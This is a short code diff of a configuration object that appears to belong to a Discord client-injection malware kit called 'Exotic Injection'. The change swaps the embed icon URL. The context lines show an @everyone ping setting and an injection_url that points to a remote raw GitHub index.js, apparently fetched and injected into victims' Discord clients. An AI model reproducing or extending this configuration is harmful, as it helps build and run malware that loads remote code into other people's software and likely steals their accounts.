@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Exotic Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1131699115286331564/1134851863599120484/9622684a7361df8199191058b8c60916.mp4'.replace(/ /g, '%20'), 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1229428763368882357/1229428803848245368/standard_1.gif?ex=662fa5cc&is=661d30cc&hm=bed9d89f67b52d86d3c0ea68161cca852fbf5e45b1cd1e8f4bf845ec3278a42e&'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/roadhooog/shop3/main/index.js', 
   /**
